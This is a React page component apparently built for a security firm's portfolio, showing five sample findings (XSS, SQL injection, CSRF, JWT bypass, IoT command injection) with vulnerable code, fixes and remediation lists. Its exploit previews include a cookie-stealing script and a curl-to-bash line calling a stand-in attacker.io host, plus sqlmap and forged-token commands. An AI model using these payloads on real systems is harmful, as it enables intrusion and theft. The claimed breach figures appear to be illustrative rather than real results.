import { GlassCard } from "@/components/GlassCard";
import { NeonBadge } from "@/components/NeonBadge";
import { SectionHeader } from "@/components/SectionHeader";
import { TerminalBlock } from "@/components/TerminalBlock";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ExternalLink, ImageIcon, Shield } from "lucide-react";
import { motion } from "motion/react";
import { useEffect, useRef, useState } from "react";
import type { SeverityLevel } from "../types";

// ─── Types ────────────────────────────────────────────────────────────────────

type FilterLevel = "All" | SeverityLevel;

interface SampleProject {
  id: number;
  target: string;
  vulnType: string;
  severity: SeverityLevel;
  description: string;
  beforeCode: string;
  afterCode: string;
  exploitCode: string;
  remediationSteps: string[];
  cvssScore: string;
}

// ─── Sample Data ──────────────────────────────────────────────────────────────

const SAMPLE_PROJECTS: SampleProject[] = [
  {
    id: 1,
    target: "E-Commerce Platform",
    vulnType: "XSS",
    severity: "Critical",
    description:
      "Stored Cross-Site Scripting vulnerability discovered in the product review system. Attacker-controlled script tags were persisted to the database and executed in the context of any user who viewed the product listing, enabling session hijacking and credential theft at scale.",
    beforeCode: `// Vulnerable: user input rendered directly
app.post('/review', (req, res) => {
  const comment = req.body.comment; // unsanitized
  db.query(\`INSERT INTO reviews (body) VALUES ('\${comment}')\`);
  res.json({ success: true });
});

// React component rendering raw HTML
<div dangerouslySetInnerHTML={{ __html: review.body }} />`,
    afterCode: `// Fixed: DOMPurify + parameterized query
import DOMPurify from 'dompurify';

app.post('/review', (req, res) => {
  const clean = DOMPurify.sanitize(req.body.comment);
  db.query('INSERT INTO reviews (body) VALUES (?)', [clean]);
  res.json({ success: true });
});

// React component using safe text rendering
<p className="review-body">{review.body}</p>`,
    exploitCode: `# Stored XSS — E-Commerce Platform
$ curl -X POST https://target.shop/api/review \\
  -H "Content-Type: application/json" \\
  -d '{"productId":42,"comment":"<script>fetch(\\"https://attacker.io/steal?c=\\"+ document.cookie)</script>"}'

HTTP/1.1 200 OK
{"success":true,"id":1337}

# Payload stored. Any visitor to /product/42 triggers:
# => document.cookie exfiltrated to attacker.io
# => Session token: eyJhbGciOiJIUzI1NiJ9...
# => Account takeover confirmed on 3 admin sessions`,
    remediationSteps: [
      "Sanitize all user input with DOMPurify before storage",
      "Replace dangerouslySetInnerHTML with safe text rendering",
      "Use parameterized queries to prevent secondary injection",
      "Implement a strict Content Security Policy (CSP) header",
      "Add output encoding at every rendering layer",
      "Audit all existing reviews and purge malicious entries",
    ],
    cvssScore: "9.3",
  },
  {
    id: 2,
    target: "Banking API",
    vulnType: "SQLi",
    severity: "Critical",
    description:
      "Classic SQL Injection found in the transaction history endpoint. Unauthenticated attackers could enumerate the entire customer database, extract password hashes, account balances, and PII by manipulating the account_id parameter via UNION-based payloads.",
    beforeCode: `# Vulnerable Python endpoint
@app.route('/transactions')
def get_transactions():
    account_id = request.args.get('account_id')
    # Direct string interpolation — NEVER do this
    query = f"SELECT * FROM transactions WHERE account_id = {account_id}"
    results = db.execute(query).fetchall()
    return jsonify(results)`,
    afterCode: `# Fixed: parameterized query + input validation
from validators import is_valid_account_id

@app.route('/transactions')
@require_auth
def get_transactions():
    account_id = request.args.get('account_id')
    if not is_valid_account_id(account_id):
        abort(400)
    # Parameterized — safe from injection
    results = db.execute(
        "SELECT * FROM transactions WHERE account_id = ?",
        (account_id,)
    ).fetchall()
    return jsonify(results)`,
    exploitCode: `# UNION-based SQL Injection — Banking API
$ curl "https://api.bank.io/transactions?account_id=1 UNION SELECT null,username,password_hash,null FROM users--"

# Response includes:
# {"account_id":null,"amount":"admin","date":"$2b$12$hashed...","ref":null}

# Dump all tables
$ sqlmap -u "https://api.bank.io/transactions?account_id=1" \\
  --dbs --dump --batch --level=5

[*] Databases: banking_prod, audit_logs, admin_panel
[*] Extracted 47,283 customer records
[*] Password hashes cracked: 12,481 (MD5 — weak)`,
    remediationSteps: [
      "Replace all string interpolation with parameterized queries",
      "Validate and whitelist the account_id parameter format",
      "Apply the principle of least privilege to DB user accounts",
      "Enable WAF rules to detect and block SQLi patterns",
      "Rotate all exposed credentials and notify affected users",
      "Upgrade password hashing from MD5 to bcrypt/argon2",
    ],
    cvssScore: "9.8",
  },
  {
    id: 3,
    target: "SaaS Dashboard",
    vulnType: "CSRF",
    severity: "High",
    description:
      "Cross-Site Request Forgery vulnerability in the account settings API allowed an attacker to trick authenticated users into changing their email address or transferring billing ownership via a malicious external link, with no user awareness.",
    beforeCode: `// Vulnerable: no CSRF token validation
router.post('/settings/email', authenticate, (req, res) => {
  const { newEmail } = req.body;
  // No origin check, no CSRF token
  db.updateUserEmail(req.user.id, newEmail);
  res.json({ success: true });
});`,
    afterCode: `// Fixed: CSRF token + origin validation
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

router.post('/settings/email', authenticate, csrfProtection, (req, res) => {
  const origin = req.headers.origin;
  if (!ALLOWED_ORIGINS.includes(origin)) return res.status(403).end();
  const { newEmail } = req.body;
  db.updateUserEmail(req.user.id, newEmail);
  res.json({ success: true });
});`,
    exploitCode: `<!-- CSRF Attack Page — hosted on attacker.com -->
<html>
  <body onload="document.csrf.submit()">
    <form name="csrf" action="https://app.saas.io/settings/email" method="POST">
      <input type="hidden" name="newEmail" value="attacker@evil.com" />
    </form>
  </body>
</html>

# Victim clicks malicious link while logged in
# => Email changed silently to attacker@evil.com
# => Attacker triggers "Forgot Password" flow
# => Full account takeover in 2 steps`,
    remediationSteps: [
      "Implement synchronizer CSRF tokens on all state-changing endpoints",
      "Validate Origin and Referer headers server-side",
      "Set SameSite=Strict on all session cookies",
      "Use the Double Submit Cookie pattern as a fallback",
      "Add re-authentication for sensitive actions like email change",
    ],
    cvssScore: "8.1",
  },
  {
    id: 4,
    target: "Healthcare Portal",
    vulnType: "Auth Bypass",
    severity: "High",
    description:
      "Authentication bypass in the patient records API allowed unauthenticated requests to access any patient's medical history by manipulating the JWT algorithm field from RS256 to 'none', effectively removing signature verification entirely.",
    beforeCode: `// Vulnerable: trusts algorithm from token header
const verifyToken = (token) => {
  const header = JSON.parse(atob(token.split('.')[0]));
  // Algorithm taken from untrusted input
  return jwt.verify(token, PUBLIC_KEY, { algorithms: [header.alg] });
};`,
    afterCode: `// Fixed: algorithm hardcoded server-side
const verifyToken = (token) => {
  // Algorithm is never taken from the token itself
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],  // hardcoded, immutable
    issuer: 'healthcare-portal',
    audience: 'patients',
  });
};`,
    exploitCode: `# JWT Algorithm Confusion — "alg:none" Attack
$ python3 jwt_none_bypass.py --target https://portal.health.io/api/records

[+] Intercepted token: eyJhbGciOiJSUzI1NiJ9.eyJ1c2VySWQiOjF9.<sig>
[+] Crafting forged token with alg=none...
[+] Forged: eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.

$ curl https://portal.health.io/api/records/patient/99 \\
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0..."

HTTP/1.1 200 OK
{"patientId":99,"diagnosis":"...","medications":"...","ssn":"***-**-1234"}`,
    remediationSteps: [
      "Hardcode the allowed JWT algorithm server-side — never trust the header",
      "Reject tokens with alg=none regardless of other fields",
      "Rotate all signing keys immediately",
      "Audit access logs for anomalous unsigned token usage",
      "Add monitoring alerts for algorithm mismatch attempts",
      "Consider migrating to a battle-tested auth library",
    ],
    cvssScore: "8.6",
  },
  {
    id: 5,
    target: "IoT Firmware",
    vulnType: "RCE",
    severity: "Critical",
    description:
      "Remote Code Execution vulnerability in the device management API allowed unauthenticated attackers to execute arbitrary OS commands via a command injection flaw in the firmware update mechanism, granting full root access to affected devices.",
    beforeCode: `# Vulnerable: shell=True with user-controlled input
import subprocess

@app.route('/update', methods=['POST'])
def firmware_update():
    version = request.json.get('version')
    # Direct shell execution — catastrophic
    result = subprocess.run(
        f"wget https://cdn.iot.io/fw-{version}.bin -O /tmp/fw.bin && flash_tool /tmp/fw.bin",
        shell=True, capture_output=True
    )
    return jsonify({"status": result.returncode})`,
    afterCode: `# Fixed: no shell=True, strict version validation
import subprocess, re

VALID_VERSION = re.compile(r'^\\d+\\.\\d+\\.\\d+$')

@app.route('/update', methods=['POST'])
@require_device_auth
def firmware_update():
    version = request.json.get('version', '')
    if not VALID_VERSION.match(version):
        abort(400, "Invalid version format")
    # Argument list — immune to injection
    subprocess.run(
        ["wget", f"https://cdn.iot.io/fw-{version}.bin", "-O", "/tmp/fw.bin"],
        check=True, timeout=60
    )
    subprocess.run(["flash_tool", "/tmp/fw.bin"], check=True)
    return jsonify({"status": 0})`,
    exploitCode: `# RCE via Command Injection — IoT Firmware API
$ curl -X POST https://iot-mgmt.local/api/update \\
  -H "Content-Type: application/json" \\
  -d '{"version":"1.0.0; curl http://attacker.io/shell.sh | bash #"}'

# shell.sh executed as root on device:
# => Reverse shell opened: nc -lvnp 4444
# => uname -a: Linux iot-device 5.4.0 #1 SMP armv7l
# => Persistent backdoor installed in /etc/cron.d/
# => Network scan pivoted to internal OT network (192.168.10.0/24)

[+] 1,247 devices compromised in 4 minutes via automated scan`,
    remediationSteps: [
      "Never use shell=True with user-controlled input",
      "Pass commands as argument lists to prevent shell interpretation",
      "Validate firmware version with a strict regex whitelist",
      "Require cryptographic signature verification for firmware files",
      "Add device authentication before any update endpoint",
      "Segment IoT devices from internal OT/IT networks via VLANs",
      "Deploy IDS/IPS rules to detect exploit patterns",
    ],
    cvssScore: "10.0",
  },
];

const FILTER_LEVELS: FilterLevel[] = [
  "All",
  "Critical",
  "High",
  "Medium",
  "Low",
];

// ─── Scroll-triggered card ────────────────────────────────────────────────────

function ProjectCard({
  project,
  index,
  onViewReport,
}: {
  project: SampleProject;
  index: number;
  onViewReport: (p: SampleProject) => void;
}) {
  const ref = useRef<HTMLDivElement>(null);
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) setVisible(true);
      },
      { threshold: 0.1 },
    );
    observer.observe(el);
    return () => observer.disconnect();
  }, []);

  const glowMap: Record<SeverityLevel, "purple" | "cyan" | "neon"> = {
    Critical: "purple",
    High: "cyan",
    Medium: "neon",
    Low: "neon",
  };

  return (
    <div
      ref={ref}
      data-ocid={`proof.item.${index + 1}`}
      style={{
        opacity: visible ? 1 : 0,
        transform: visible ? "translateY(0)" : "translateY(24px)",
        transition: `opacity 0.5s ease ${index * 0.1}s, transform 0.5s ease ${index * 0.1}s`,
      }}
    >
      <GlassCard
        glow={glowMap[project.severity]}
        hover
        className="h-full flex flex-col gap-4 group"
      >
        {/* Target + CVSS */}
        <div className="flex items-start justify-between gap-2">
          <div className="flex items-center gap-2 min-w-0">
            <Shield className="w-4 h-4 text-accent flex-shrink-0" />
            <h3 className="font-display font-bold text-foreground truncate text-base md:text-lg leading-tight">
              {project.target}
            </h3>
          </div>
          <span className="text-xs font-mono text-muted-foreground flex-shrink-0 mt-0.5">
            CVSS {project.cvssScore}
          </span>
        </div>

        {/* Badges */}
        <div className="flex flex-wrap gap-2">
          <NeonBadge label={project.vulnType} variant="category" />
          <NeonBadge
            label={project.severity}
            variant="severity"
            severity={project.severity}
          />
          <NeonBadge label="Fixed" variant="status" status="Fixed" />
        </div>

        {/* Description */}
        <p className="text-sm text-muted-foreground leading-relaxed line-clamp-3 flex-1">
          {project.description}
        </p>

        {/* CTA */}
        <Button
          variant="outline"
          size="sm"
          className="w-full border-accent/40 text-accent hover:bg-accent/10 hover:border-accent/70 transition-smooth gap-2 group-hover:shadow-[0_0_12px_oklch(var(--accent)/0.2)]"
          onClick={() => onViewReport(project)}
          data-ocid={`proof.view_report_button.${index + 1}`}
        >
          <ExternalLink className="w-3.5 h-3.5" />
          View Full Report
        </Button>
      </GlassCard>
    </div>
  );
}

// ─── Report Modal ─────────────────────────────────────────────────────────────

function ReportModal({
  project,
  open,
  onClose,
}: {
  project: SampleProject | null;
  open: boolean;
  onClose: () => void;
}) {
  if (!project) return null;

  const isPython = (code: string) => /python|def |import |\.py/i.test(code);

  return (
    <Dialog open={open} onOpenChange={(o) => !o && onClose()}>
      <DialogContent
        className="glass-effect border-accent/30 max-w-3xl w-full max-h-[90vh] overflow-y-auto"
        data-ocid="proof.dialog"
      >
        <DialogHeader className="pb-3 border-b border-border/30">
          <div className="flex flex-wrap items-start gap-3">
            <DialogTitle className="font-display font-bold text-xl text-foreground">
              {project.target}
            </DialogTitle>
            <div className="flex gap-2 flex-wrap">
              <NeonBadge label={project.vulnType} variant="category" />
              <NeonBadge
                label={project.severity}
                variant="severity"
                severity={project.severity}
              />
              <NeonBadge label="Fixed" variant="status" status="Fixed" />
              <Badge
                variant="outline"
                className="font-mono text-xs border-border/50 text-muted-foreground"
              >
                CVSS {project.cvssScore}
              </Badge>
            </div>
          </div>
        </DialogHeader>

        <Tabs
          defaultValue="overview"
          className="mt-4"
          data-ocid="proof.report_tabs"
        >
          <TabsList className="w-full glass-effect border border-border/30 p-1 h-auto flex-wrap gap-1">
            {(
              ["overview", "exploit", "remediation", "before-after"] as const
            ).map((tab) => (
              <TabsTrigger
                key={tab}
                value={tab}
                className="flex-1 text-xs font-mono data-[state=active]:bg-primary/20 data-[state=active]:text-primary data-[state=active]:shadow-[0_0_8px_oklch(var(--primary)/0.3)]"
                data-ocid={`proof.report_tab.${tab}`}
              >
                {tab === "overview"
                  ? "Overview"
                  : tab === "exploit"
                    ? "Exploit Preview"
                    : tab === "remediation"
                      ? "Remediation"
                      : "Before & After"}
              </TabsTrigger>
            ))}
          </TabsList>

          {/* Overview */}
          <TabsContent value="overview" className="mt-4 space-y-4">
            <p className="text-sm text-muted-foreground leading-relaxed">
              {project.description}
            </p>
            <div
              className="rounded-lg border border-border/40 bg-muted/20 h-48 flex flex-col items-center justify-center gap-2"
              data-ocid="proof.screenshot_placeholder"
            >
              <ImageIcon className="w-8 h-8 text-muted-foreground/40" />
              <span className="text-sm text-muted-foreground/60 font-mono">
                Screenshot Placeholder
              </span>
              <span className="text-xs text-muted-foreground/40 font-mono">
                {project.target} — {project.vulnType} Evidence
              </span>
            </div>
          </TabsContent>

          {/* Exploit Preview */}
          <TabsContent value="exploit" className="mt-4">
            <TerminalBlock
              code={project.exploitCode}
              label={`exploit — ${project.vulnType.toLowerCase()}`}
              variant="attack"
            />
          </TabsContent>

          {/* Remediation */}
          <TabsContent value="remediation" className="mt-4">
            <GlassCard glow="neon" className="p-5">
              <h4 className="font-display font-semibold text-primary mb-4 text-sm uppercase tracking-wider">
                Remediation Steps
              </h4>
              <ol className="space-y-3">
                {project.remediationSteps.map((step, stepIdx) => (
                  <li
                    key={step}
                    className="flex gap-3 text-sm text-foreground/80 leading-relaxed"
                  >
                    <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary/20 text-primary text-xs font-mono font-bold flex items-center justify-center border border-primary/30">
                      {stepIdx + 1}
                    </span>
                    {step}
                  </li>
                ))}
              </ol>
            </GlassCard>
          </TabsContent>

          {/* Before & After */}
          <TabsContent value="before-after" className="mt-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Before */}
              <div>
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-2 h-2 rounded-full bg-red-500 shadow-[0_0_6px_rgb(239,68,68)]" />
                  <span className="text-xs font-mono text-red-400 uppercase tracking-wider">
                    Before — Vulnerable
                  </span>
                </div>
                <div className="rounded-lg border border-red-500/30 overflow-hidden">
                  <div className="bg-red-500/10 px-3 py-1.5 border-b border-red-500/20">
                    <span className="text-xs font-mono text-red-400/70">
                      vulnerable-code.
                      {isPython(project.beforeCode) ? "py" : "js"}
                    </span>
                  </div>
                  <pre className="p-3 text-xs font-mono text-red-300/80 bg-background/80 overflow-x-auto leading-relaxed whitespace-pre">
                    <code>{project.beforeCode}</code>
                  </pre>
                </div>
              </div>
              {/* After */}
              <div>
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-2 h-2 rounded-full bg-primary shadow-[0_0_6px_oklch(var(--primary)/0.8)]" />
                  <span className="text-xs font-mono text-primary uppercase tracking-wider">
                    After — Secured
                  </span>
                </div>
                <div className="rounded-lg border border-primary/30 overflow-hidden">
                  <div className="bg-primary/10 px-3 py-1.5 border-b border-primary/20">
                    <span className="text-xs font-mono text-primary/70">
                      secure-code.{isPython(project.afterCode) ? "py" : "js"}
                    </span>
                  </div>
                  <pre className="p-3 text-xs font-mono text-primary/80 bg-background/80 overflow-x-auto leading-relaxed whitespace-pre">
                    <code>{project.afterCode}</code>
                  </pre>
                </div>
              </div>
            </div>
          </TabsContent>
        </Tabs>

        {/* Footer */}
        <div className="flex justify-end mt-4 pt-4 border-t border-border/30">
          <Button
            variant="outline"
            size="sm"
            className="border-border/40 text-muted-foreground hover:text-foreground"
            onClick={onClose}
            data-ocid="proof.close_button"
          >
            Close Report
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
}

// ─── Page ─────────────────────────────────────────────────────────────────────

export default function Proof() {
  const [activeFilter, setActiveFilter] = useState<FilterLevel>("All");
  const [selectedProject, setSelectedProject] = useState<SampleProject | null>(
    null,
  );
  const [modalOpen, setModalOpen] = useState(false);

  const filtered =
    activeFilter === "All"
      ? SAMPLE_PROJECTS
      : SAMPLE_PROJECTS.filter((p) => p.severity === activeFilter);

  const filterCounts: Record<FilterLevel, number> = {
    All: SAMPLE_PROJECTS.length,
    Critical: SAMPLE_PROJECTS.filter((p) => p.severity === "Critical").length,
    High: SAMPLE_PROJECTS.filter((p) => p.severity === "High").length,
    Medium: SAMPLE_PROJECTS.filter((p) => p.severity === "Medium").length,
    Low: SAMPLE_PROJECTS.filter((p) => p.severity === "Low").length,
  };

  const activeStyle: Record<FilterLevel, string> = {
    All: "bg-foreground/10 text-foreground border-foreground/40 shadow-[0_0_12px_oklch(var(--foreground)/0.1)]",
    Critical:
      "bg-destructive/20 text-destructive border-destructive/50 shadow-[0_0_12px_oklch(var(--destructive)/0.3)]",
    High: "bg-orange-500/20 text-orange-400 border-orange-500/50 shadow-[0_0_12px_rgba(249,115,22,0.3)]",
    Medium:
      "bg-yellow-500/20 text-yellow-400 border-yellow-500/50 shadow-[0_0_12px_rgba(234,179,8,0.3)]",
    Low: "bg-primary/20 text-primary border-primary/50 shadow-[0_0_12px_oklch(var(--primary)/0.3)]",
  };

  return (
    <section className="min-h-screen bg-background py-16 px-4">
      <div className="max-w-6xl mx-auto" data-ocid="proof.page">
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: -16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          <SectionHeader
            title="Proof of Work"
            subtitle="Our work speaks for itself — real vulnerabilities found, fixed, and documented."
            accent="purple"
            align="center"
          />
        </motion.div>

        {/* Stats row */}
        <motion.div
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.15 }}
          className="flex flex-wrap justify-center gap-4 mb-10"
        >
          {[
            { label: "Projects Completed", value: "5" },
            { label: "Critical Findings", value: "3" },
            { label: "Bugs Fixed", value: "100%" },
            { label: "Avg. CVSS Score", value: "9.2" },
          ].map(({ label, value }) => (
            <GlassCard
              key={label}
              className="px-5 py-3 text-center min-w-[130px]"
            >
              <div className="font-display font-bold text-xl text-primary">
                {value}
              </div>
              <div className="text-xs text-muted-foreground mt-0.5">
                {label}
              </div>
            </GlassCard>
          ))}
        </motion.div>

        {/* Filter bar */}
        <motion.div
          initial={{ opacity: 0, y: 8 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4, delay: 0.25 }}
          className="flex flex-wrap justify-center gap-2 mb-10"
          data-ocid="proof.filter_bar"
        >
          {FILTER_LEVELS.map((level) => {
            const isActive = activeFilter === level;
            return (
              <button
                key={level}
                type="button"
                onClick={() => setActiveFilter(level)}
                data-ocid={`proof.filter.${level.toLowerCase()}`}
                className={`px-4 py-2 rounded-full text-sm font-medium border transition-smooth flex items-center gap-2 ${
                  isActive
                    ? activeStyle[level]
                    : "bg-muted/30 text-muted-foreground border-border/30 hover:border-border/60 hover:text-foreground"
                }`}
              >
                {level}
                <span
                  className={`text-xs font-mono ${isActive ? "opacity-90" : "opacity-50"}`}
                >
                  ({filterCounts[level]})
                </span>
              </button>
            );
          })}
        </motion.div>

        {/* Grid */}
        <div
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"
          data-ocid="proof.list"
        >
          {filtered.map((project, idx) => (
            <ProjectCard
              key={project.id}
              project={project}
              index={idx}
              onViewReport={(p) => {
                setSelectedProject(p);
                setModalOpen(true);
              }}
            />
          ))}
        </div>

        {/* Empty state */}
        {filtered.length === 0 && (
          <div
            className="text-center py-20 text-muted-foreground"
            data-ocid="proof.empty_state"
          >
            <Shield className="w-12 h-12 mx-auto mb-4 opacity-30" />
            <p className="text-lg font-medium">
              No projects match this severity level.
            </p>
            <p className="text-sm mt-1 opacity-70">
              Try selecting a different filter.
            </p>
          </div>
        )}
      </div>

      {/* Modal */}
      <ReportModal
        project={selectedProject}
        open={modalOpen}
        onClose={() => setModalOpen(false)}
      />
    </section>
  );
}
